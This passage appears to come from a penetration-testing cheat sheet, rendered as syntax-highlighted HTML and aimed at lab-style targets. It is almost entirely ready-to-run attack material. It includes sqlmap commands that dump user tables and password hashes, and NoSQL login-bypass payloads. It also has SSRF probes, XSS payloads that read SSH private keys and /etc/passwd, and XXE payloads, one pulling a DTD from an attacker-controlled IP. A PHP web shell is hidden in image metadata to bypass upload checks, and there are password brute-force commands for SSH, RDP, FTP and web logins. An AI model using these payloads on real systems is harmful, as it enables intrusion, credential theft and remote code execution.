<span class="n">sqlmap</span><span class="w"> </span><span class="o">-</span><span class="n">r</span><span class="w"> </span><span class="n">post</span><span class="o">.</span><span class="n">login</span><span class="o">.</span><span class="n">req</span><span class="w"> </span><span class="o">--</span><span class="n">threads</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="o">--</span><span class="n">time</span><span class="o">-</span><span class="n">sec</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="o">--</span><span class="n">level</span><span class="o">=</span><span class="mi">5</span><span class="w"> </span><span class="o">--</span><span class="n">risk</span><span class="o">=</span><span class="mi">3</span><span class="w"> </span><span class="o">--</span><span class="n">dbms</span><span class="o">=</span><span class="n">mssql</span><span class="w"> </span><span class="o">-</span><span class="n">T</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="o">-</span><span class="n">C</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="n">password_hash</span><span class="w"> </span><span class="o">--</span><span class="n">random</span><span class="o">-</span><span class="n">agent</span><span class="w"> </span><span class="o">--</span><span class="n">batch</span><span class="w"> </span><span class="o">--</span><span class="n">dump</span>

<span class="c1"># Get</span>
<span class="n">sqlmap</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="s2">&quot;http://10.11.1.111/index.php?id=1&quot;</span><span class="w"> </span><span class="o">--</span><span class="n">dbms</span><span class="o">=</span><span class="n">mysql</span>

<span class="c1"># Crawl</span>
<span class="n">sqlmap</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">--</span><span class="n">dbms</span><span class="o">=</span><span class="n">mysql</span><span class="w"> </span><span class="o">--</span><span class="n">crawl</span><span class="o">=</span><span class="mi">3</span>

<span class="c1"># Full auto - THE GOOD ONE</span>
<span class="n">sqlmap</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="s1">&#39;http://10.11.1.111:1337/978345210/index.php&#39;</span><span class="w"> </span><span class="o">--</span><span class="n">forms</span><span class="w"> </span><span class="o">--</span><span class="n">dbs</span><span class="w"> </span><span class="o">--</span><span class="n">risk</span><span class="o">=</span><span class="mi">3</span><span class="w"> </span><span class="o">--</span><span class="n">level</span><span class="o">=</span><span class="mi">5</span><span class="w"> </span><span class="o">--</span><span class="n">threads</span><span class="o">=</span><span class="mi">4</span><span class="w"> </span><span class="o">--</span><span class="n">batch</span>
<span class="c1"># Columns</span>
<span class="n">sqlmap</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="s1">&#39;http://admin.cronos.htb/index.php&#39;</span><span class="w"> </span><span class="o">--</span><span class="n">forms</span><span class="w"> </span><span class="o">--</span><span class="n">dbms</span><span class="o">=</span><span class="n">MySQL</span><span class="w"> </span><span class="o">--</span><span class="n">risk</span><span class="o">=</span><span class="mi">3</span><span class="w"> </span><span class="o">--</span><span class="n">level</span><span class="o">=</span><span class="mi">5</span><span class="w"> </span><span class="o">--</span><span class="n">threads</span><span class="o">=</span><span class="mi">4</span><span class="w"> </span><span class="o">--</span><span class="n">batch</span><span class="w"> </span><span class="o">--</span><span class="n">columns</span><span class="w"> </span><span class="o">-</span><span class="n">T</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="o">-</span><span class="n">D</span><span class="w"> </span><span class="n">admin</span>
<span class="c1"># Values</span>
<span class="n">sqlmap</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="s1">&#39;http://admin.cronos.htb/index.php&#39;</span><span class="w"> </span><span class="o">--</span><span class="n">forms</span><span class="w"> </span><span class="o">--</span><span class="n">dbms</span><span class="o">=</span><span class="n">MySQL</span><span class="w"> </span><span class="o">--</span><span class="n">risk</span><span class="o">=</span><span class="mi">3</span><span class="w"> </span><span class="o">--</span><span class="n">level</span><span class="o">=</span><span class="mi">5</span><span class="w"> </span><span class="o">--</span><span class="n">threads</span><span class="o">=</span><span class="mi">4</span><span class="w"> </span><span class="o">--</span><span class="n">batch</span><span class="w"> </span><span class="o">--</span><span class="n">dump</span><span class="w"> </span><span class="o">-</span><span class="n">T</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="o">-</span><span class="n">D</span><span class="w"> </span><span class="n">admin</span>

<span class="n">sqlmap</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="s2">&quot;http://10.11.1.111:1337/978345210/index.php&quot;</span><span class="w"> </span><span class="o">--</span><span class="n">data</span><span class="o">=</span><span class="s2">&quot;username=admin&amp;password=pass&amp;submit=+Login+&quot;</span><span class="w"> </span><span class="o">--</span><span class="n">method</span><span class="o">=</span><span class="n">POST</span><span class="w"> </span><span class="o">--</span><span class="n">level</span><span class="o">=</span><span class="mi">3</span><span class="w"> </span><span class="o">--</span><span class="n">threads</span><span class="o">=</span><span class="mi">10</span><span class="w"> </span><span class="o">--</span><span class="n">dbms</span><span class="o">=</span><span class="n">MySQL</span><span class="w"> </span><span class="o">--</span><span class="n">users</span><span class="w"> </span><span class="o">--</span><span class="n">passwords</span>

<span class="n">sqlmap</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">133.52</span><span class="o">/</span><span class="n">zm</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="w"> </span><span class="o">--</span><span class="n">data</span><span class="o">=</span><span class="s2">&quot;view=request&amp;request=log&amp;task=query&amp;limit=100&amp;minTime=5&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">D</span><span class="w"> </span><span class="n">zm</span><span class="w"> </span><span class="o">--</span><span class="n">tables</span><span class="w"> </span><span class="o">--</span><span class="n">threads</span><span class="w"> </span><span class="mi">5</span>
<span class="c1"># NoSQL</span>
<span class="s1">&#39; || &#39;</span><span class="n">a</span><span class="s1">&#39;==&#39;</span><span class="n">a</span>
<span class="n">mongodbserver</span><span class="p">:</span><span class="n">port</span><span class="o">/</span><span class="n">status</span><span class="err">?</span><span class="n">text</span><span class="o">=</span><span class="mi">1</span>

<span class="c1">#in URL</span>
<span class="n">username</span><span class="p">[</span><span class="o">$</span><span class="n">ne</span><span class="p">]</span><span class="o">=</span><span class="n">toto</span><span class="o">&amp;</span><span class="n">password</span><span class="p">[</span><span class="o">$</span><span class="n">ne</span><span class="p">]</span><span class="o">=</span><span class="n">toto</span>

<span class="c1">#in JSON</span>
<span class="p">{</span><span class="s2">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="s2">&quot;$ne&quot;</span><span class="p">:</span><span class="w"> </span><span class="nb nb-Type">null</span><span class="p">},</span><span class="w"> </span><span class="s2">&quot;password&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="s2">&quot;$ne&quot;</span><span class="p">:</span><span class="w"> </span><span class="nb nb-Type">null</span><span class="p">}}</span>
<span class="p">{</span><span class="s2">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="s2">&quot;$gt&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">},</span><span class="w"> </span><span class="s2">&quot;password&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="s2">&quot;$gt&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">}}</span>

<span class="c1">## SSRF</span>

<span class="n">web</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">send</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">external</span><span class="w"> </span><span class="n">IP</span><span class="s1">&#39;s, we call 127.0.0.1:8080 / 10.1.10.111 to enum internal network</span>

<span class="n">chat</span><span class="p">:</span><span class="mi">3000</span><span class="o">/</span><span class="n">ssrf</span><span class="err">?</span><span class="n">user</span><span class="o">=&amp;</span><span class="n">comment</span><span class="o">=&amp;</span><span class="n">link</span><span class="o">=</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">3000</span>
<span class="n">GET</span><span class="w"> </span><span class="o">/</span><span class="n">ssrf</span><span class="err">?</span><span class="n">user</span><span class="o">=&amp;</span><span class="n">comment</span><span class="o">=&amp;</span><span class="n">link</span><span class="o">=</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">3000</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>

<span class="n">Also</span><span class="w"> </span><span class="n">we</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="k">enum</span><span class="w"> </span><span class="n">ports</span>
</code></pre></div>

<h3>XSS</h3>
<div class="highlight"><pre><span></span><code><span class="o">&lt;</span><span class="n">script</span><span class="o">&gt;</span><span class="n">alert</span><span class="p">(</span><span class="ss">&quot;XSS&quot;</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">script</span><span class="o">&gt;</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span>

<span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">noob</span><span class="p">.</span><span class="n">ninja</span><span class="o">/</span><span class="mi">2017</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="k">local</span><span class="o">-</span><span class="k">file</span><span class="o">-</span><span class="k">read</span><span class="o">-</span><span class="n">via</span><span class="o">-</span><span class="n">xss</span><span class="o">-</span><span class="ow">in</span><span class="o">-</span><span class="n">dynamically</span><span class="p">.</span><span class="n">html</span><span class="vm">?</span><span class="n">m</span><span class="o">=</span><span class="mi">1</span>

<span class="ss">&quot; &lt;script&gt; x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText.fontsize(1)) }; x.open(&quot;</span><span class="k">GET</span><span class="ss">&quot;,&quot;</span><span class="k">file</span><span class="err">:</span><span class="o">///</span><span class="n">home</span><span class="o">/</span><span class="n">reader</span><span class="o">/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span><span class="ss">&quot;); x.send(); &lt;/script&gt;</span>

<span class="ss">&quot;</span><span class="w"> </span><span class="o">&lt;</span><span class="n">script</span><span class="o">&gt;</span><span class="w"> </span><span class="n">x</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">XMLHttpRequest</span><span class="p">;</span><span class="w"> </span><span class="n">x</span><span class="p">.</span><span class="n">onload</span><span class="o">=</span><span class="k">function</span><span class="p">()</span><span class="err">{</span><span class="w"> </span><span class="n">document</span><span class="p">.</span><span class="k">write</span><span class="p">(</span><span class="n">this</span><span class="p">.</span><span class="n">responseText</span><span class="p">)</span><span class="w"> </span><span class="err">}</span><span class="p">;</span><span class="w"> </span><span class="n">x</span><span class="p">.</span><span class="k">open</span><span class="p">(</span><span class="ss">&quot;GET&quot;</span><span class="p">,</span><span class="ss">&quot;file:///etc/passwd&quot;</span><span class="p">);</span><span class="w"> </span><span class="n">x</span><span class="p">.</span><span class="n">send</span><span class="p">();</span><span class="w"> </span><span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span>

<span class="err">#</span><span class="w"> </span><span class="n">XXE</span>

<span class="nc">XML</span><span class="w"> </span><span class="n">entry</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="k">reads</span><span class="w"> </span><span class="n">server</span><span class="p">,</span><span class="w"> </span><span class="n">Doctype</span><span class="p">,</span><span class="w"> </span><span class="n">change</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">entity</span><span class="w"> </span><span class="ss">&quot;System &quot;</span><span class="k">file</span><span class="err">:</span><span class="o">///</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="ss">&quot;&quot;</span>

<span class="n">Instead</span><span class="w"> </span><span class="nl">POST</span><span class="p">:</span>

<span class="o">&lt;</span><span class="vm">?</span><span class="nc">xml</span><span class="w"> </span><span class="n">version</span><span class="o">=</span><span class="ss">&quot;1.0&quot;</span><span class="w"> </span><span class="vm">?</span><span class="o">&gt;</span>
<span class="w">    </span><span class="o">&lt;</span><span class="err">!</span><span class="n">DOCTYPE</span><span class="w"> </span><span class="n">thp</span><span class="w"> </span><span class="o">[</span>
<span class="n">        &lt;!ELEMENT thp ANY&gt;</span>
<span class="n">        &lt;!ENTITY book &quot;Universe&quot;&gt;</span>
<span class="n">    </span><span class="o">]&gt;</span>
<span class="w">    </span><span class="o">&lt;</span><span class="n">thp</span><span class="o">&gt;</span><span class="n">Hack</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="o">&amp;</span><span class="n">book</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">thp</span><span class="o">&gt;</span>

<span class="n">Malicious</span><span class="w"> </span><span class="nc">XML</span><span class="err">:</span>

<span class="o">&lt;</span><span class="vm">?</span><span class="nc">xml</span><span class="w"> </span><span class="n">version</span><span class="o">=</span><span class="ss">&quot;1.0&quot;</span><span class="w"> </span><span class="vm">?</span><span class="o">&gt;&lt;</span><span class="err">!</span><span class="n">DOCTYPE</span><span class="w"> </span><span class="n">thp</span><span class="w"> </span><span class="o">[</span><span class="n"> &lt;!ELEMENT thp ANY&gt;</span>
<span class="n">&lt;!ENTITY book SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><span class="o">]&gt;&lt;</span><span class="n">thp</span><span class="o">&gt;</span><span class="n">Hack</span><span class="w"> </span><span class="n">The</span>
<span class="o">%</span><span class="mi">26</span><span class="n">book</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">&lt;/</span><span class="n">thp</span><span class="o">&gt;</span>

<span class="n">XXE</span><span class="w"> </span><span class="n">OOB</span>

<span class="o">&lt;</span><span class="vm">?</span><span class="nc">xml</span><span class="w"> </span><span class="n">version</span><span class="o">=</span><span class="ss">&quot;1.0&quot;</span><span class="vm">?</span><span class="o">&gt;&lt;</span><span class="err">!</span><span class="n">DOCTYPE</span><span class="w"> </span><span class="n">thp</span><span class="w"> </span><span class="o">[</span><span class="n">&lt;!ELEMENT thp ANY &gt;</span>
<span class="n">&lt;!ENTITY % dtd SYSTEM &quot;http://[YOUR_IP</span><span class="o">]/</span><span class="n">payload</span><span class="p">.</span><span class="n">dtd</span><span class="err">&quot;</span><span class="o">&gt;</span><span class="w"> </span><span class="o">%</span><span class="n">dtd</span><span class="p">;</span><span class="err">]</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">thp</span><span class="o">&gt;&lt;</span><span class="n">error</span><span class="o">&gt;%</span><span class="mi">26</span><span class="n">send</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">&lt;/</span><span class="n">error</span><span class="o">&gt;&lt;/</span><span class="n">thp</span><span class="o">&gt;</span>
</code></pre></div>

<h3>Sql-login-bypass</h3>
<ul>
<li>Open Burp-suite</li>
<li>Make and intercept a request</li>
<li>Send to intruder</li>
<li>Cluster attack.</li>
<li>Paste in sqlibypass-list (https://bobloblaw.gitbooks.io/security/content/sql-injections.html)</li>
<li>Attack</li>
<li>Check for response length variation</li>
</ul>
<h3>Bypass image upload restrictions</h3>
<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="nx">Change</span><span class="w"> </span><span class="nx">extension</span><span class="o">:</span><span class="w"> </span><span class="p">.</span><span class="nx">pHp3</span><span class="w"> </span><span class="nx">or</span><span class="w"> </span><span class="nx">pHp3</span><span class="p">.</span><span class="nx">jpg</span>
<span class="o">-</span><span class="w"> </span><span class="nx">Modify</span><span class="w"> </span><span class="nx">mimetype</span><span class="o">:</span><span class="w"> </span><span class="nx">Content</span><span class="o">-</span><span class="nx">type</span><span class="o">:</span><span class="w"> </span><span class="nx">image</span><span class="o">/</span><span class="nx">jpeg</span>
<span class="o">-</span><span class="w"> </span><span class="nx">Bypass</span><span class="w"> </span><span class="nx">getimagesize</span><span class="p">()</span><span class="o">:</span><span class="w"> </span><span class="nx">exiftool</span><span class="w"> </span><span class="o">-</span><span class="nx">Comment</span><span class="o">=</span><span class="s1">&#39;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="s2">&quot;&lt;pre&gt;&quot;</span><span class="p">;</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="s1">&#39;</span><span class="w"> </span><span class="nx">file</span><span class="p">.</span><span class="nx">jpg</span>
<span class="o">-</span><span class="w"> </span><span class="nx">Add</span><span class="w"> </span><span class="nx">gif</span><span class="w"> </span><span class="nx">header</span><span class="o">:</span><span class="w"> </span><span class="nx">GIF89a</span><span class="p">;</span>
<span class="o">-</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">same</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span>
</code></pre></div>

<h2>Password brute force - last resort</h2>
<p>Offline local resources</p>
<div class="highlight"><pre><span></span><code><span class="n">cewl</span>
<span class="n">hash</span><span class="o">-</span><span class="n">identifier</span>
<span class="n">pdfcrack</span><span class="w"> </span><span class="n">SomeFile</span><span class="p">.</span><span class="n">pdf</span><span class="w"> </span><span class="o">-</span><span class="n">w</span><span class="w"> </span><span class="o">~</span><span class="n">kali</span><span class="o">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="p">(</span><span class="k">For</span><span class="w"> </span><span class="n">PDF</span><span class="w"> </span><span class="n">files</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">passwords</span><span class="p">)</span>
<span class="n">fcrackzip</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="o">-</span><span class="n">D</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="o">~</span><span class="n">kali</span><span class="o">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="n">SomeZip</span><span class="p">.</span><span class="k">backup</span><span class="w"> </span><span class="p">(</span><span class="n">Cracking</span><span class="w"> </span><span class="n">zip</span><span class="w"> </span><span class="n">files</span><span class="w"> </span><span class="n">passwords</span><span class="p">)</span>
<span class="n">rar2john</span><span class="w"> </span><span class="n">MSSQL_BAK</span><span class="p">.</span><span class="n">rar</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">john</span><span class="w"> </span><span class="o">-</span><span class="n">wordlist</span><span class="o">=/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="o">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="n">MSQL</span><span class="p">.</span><span class="n">hashes</span><span class="w"> </span><span class="p">(</span><span class="n">Cracking</span><span class="w"> </span><span class="n">rar</span><span class="w"> </span><span class="n">files</span><span class="p">)</span>
<span class="n">john</span><span class="w"> </span><span class="o">--</span><span class="n">rules</span><span class="w"> </span><span class="o">--</span><span class="n">wordlist</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="n">unshadowed</span><span class="p">.</span><span class="n">txt</span>
<span class="n">john</span><span class="w"> </span><span class="o">--</span><span class="n">wordlist</span><span class="o">=/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="o">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="n">sammy_hash</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="n">Crack</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="n">hash</span><span class="w"> </span><span class="o">[</span><span class="n">user:hash</span><span class="o">]</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="k">file</span>
<span class="n">medusa</span><span class="w"> </span><span class="o">-</span><span class="n">h</span><span class="w"> </span><span class="mf">10.11.1.111</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="k">admin</span><span class="w"> </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="n">password</span><span class="o">-</span><span class="k">file</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">-</span><span class="n">M</span><span class="w"> </span><span class="n">http</span><span class="w"> </span><span class="o">-</span><span class="n">m</span><span class="w"> </span><span class="nl">DIR</span><span class="p">:</span><span class="o">/</span><span class="k">admin</span><span class="w"> </span><span class="o">-</span><span class="n">T</span><span class="w"> </span><span class="mi">10</span>
<span class="n">ncrack</span><span class="w"> </span><span class="o">-</span><span class="n">vv</span><span class="w"> </span><span class="o">--</span><span class="k">user</span><span class="w"> </span><span class="n">offsec</span><span class="w"> </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="n">password</span><span class="o">-</span><span class="k">file</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="nl">rdp</span><span class="p">:</span><span class="o">//</span><span class="mf">10.11.1.111</span>
<span class="n">crowbar</span><span class="w"> </span><span class="o">-</span><span class="n">b</span><span class="w"> </span><span class="n">rdp</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="mf">10.11.1.111</span><span class="o">/</span><span class="mi">32</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">victim</span><span class="w"> </span><span class="o">-</span><span class="n">C</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">words</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">-</span><span class="n">n</span><span class="w"> </span><span class="mi">1</span>
<span class="n">hydra</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="n">password</span><span class="o">-</span><span class="k">file</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="mf">10.11.1.111</span><span class="w"> </span><span class="n">ssh</span>
<span class="n">hydra</span><span class="w"> </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="n">password</span><span class="o">-</span><span class="k">file</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="mf">10.11.1.111</span><span class="w"> </span><span class="n">snmp</span>
<span class="n">hydra</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="n">USERNAME</span><span class="w"> </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlistsnmap</span><span class="p">.</span><span class="n">lst</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="mf">10.11.1.111</span><span class="w"> </span><span class="n">ftp</span><span class="w"> </span><span class="o">-</span><span class="n">V</span>
<span class="n">hydra</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="n">USERNAME</span><span class="w"> </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlistsnmap</span><span class="p">.</span><span class="n">lst</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="mf">10.11.1.111</span><span class="w"> </span><span class="n">pop3</span><span class="w"> </span><span class="o">-</span><span class="n">V</span>
<span class="n">hydra</span><span class="w"> </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlistsnmap</span><span class="p">.</span><span class="n">lst</span><span class="w"> </span><span class="mf">10.11.1.111</span><span class="w"> </span><span class="n">smtp</span><span class="w"> </span><span class="o">-</span><span class="n">V</span>

<span class="err">#</span><span class="w"> </span><span class="n">SIMPLE</span><span class="w"> </span><span class="n">LOGIN</span><span class="w"> </span><span class="k">GET</span>
<span class="n">hydra</span><span class="w"> </span><span class="o">-</span><span class="n">L</span><span class="w"> </span><span class="n">cewl_fin_50</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="n">cewl_fin_50</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="mf">10.11.1.111</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="k">get</span><span class="o">-</span><span class="n">form</span><span class="w"> </span><span class="ss">&quot;/~login:username=^USER^&amp;password=^PASS^&amp;Login=Login:Unauthorized&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">V</span>

<span class="err">#</span><span class="w"> </span><span class="k">GET</span><span class="w"> </span><span class="n">FORM</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">HTTPS</span>
<span class="n">hydra</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="k">admin</span><span class="w"> </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="mf">10.11.1.111</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="mi">443</span><span class="w"> </span><span class="o">-</span><span class="n">S</span><span class="w"> </span><span class="n">https</span><span class="o">-</span><span class="k">get</span><span class="o">-</span><span class="n">form</span><span class="w"> </span><span class="ss">&quot;/index.php:login=^USER^&amp;password=^PASS^:Incorrect login/password\!&quot;</span>

<span class="err">#</span><span class="w"> </span><span class="n">SIMPLE</span><span class="w"> </span><span class="n">LOGIN</span><span class="w"> </span><span class="n">POST</span>
<span class="n">hydra</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="n">root</span><span class="nv">@localhost</span><span class="w"> </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="n">cewl</span><span class="w"> </span><span class="mf">10.11.1.111</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="n">post</span><span class="o">-</span><span class="n">form</span><span class="w"> </span><span class="ss">&quot;/otrs/index.pl:Action=Login&amp;RequestedURL=&amp;Lang=en&amp;TimeOffset=-120&amp;User=^USER^&amp;Password=^PASS^:F=Login failed&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">I</span>

<span class="err">#</span><span class="w"> </span><span class="n">API</span><span class="w"> </span><span class="n">REST</span><span class="w"> </span><span class="n">LOGIN</span><span class="w"> </span><span class="n">POST</span>
<span class="n">hydra</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="k">admin</span><span class="w"> </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">wfuzz</span><span class="o">/</span><span class="n">others</span><span class="o">/</span><span class="n">common_pass</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">-</span><span class="n">V</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="mi">80</span><span class="w"> </span><span class="mf">10.11.1.111</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="n">post</span><span class="o">-</span><span class="n">form</span><span class="w"> </span><span class="ss">&quot;/centreon/api/index.php?action=authenticate:username=^USER^&amp;password=^PASS^:Bad credentials&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">t</span><span class="w"> </span><span class="mi">64</span>

<span class="err">#</span><span class="w"> </span><span class="k">Dictionary</span><span class="w"> </span><span class="n">creation</span>
<span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">LandGrey</span><span class="o">/</span><span class="n">pydictor</span>
<span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">Mebus</span><span class="o">/</span><span class="n">cupp</span>
<span class="n">git</span><span class="w"> </span><span class="n">clone</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">sc0tfree</span><span class="o">/</span><span class="n">mentalist</span><span class="p">.</span><span class="n">git</span>
</code></pre></div>

<p>Hashcat</p>
<div class="highlight"><pre><span></span><code><span class="nx">https</span><span class="p">:</span><span class="c1">//hashcat.net/wiki/doku.php?id=example_hashes // m parameter</span>
<span class="nx">https</span><span class="p">:</span><span class="c1">//mattw.io/hashID/types // hashid match</span>

<span class="nx">hashcat</span><span class="w"> </span><span class="o">-</span><span class="nx">m</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">hash</span><span class="err">$&#39;</span><span class="w"> </span><span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">kali</span><span class="o">/</span><span class="nx">rockyou</span><span class="p">.</span><span class="nx">txt</span><span class="w"> </span><span class="c1">// MD5 raw</span>
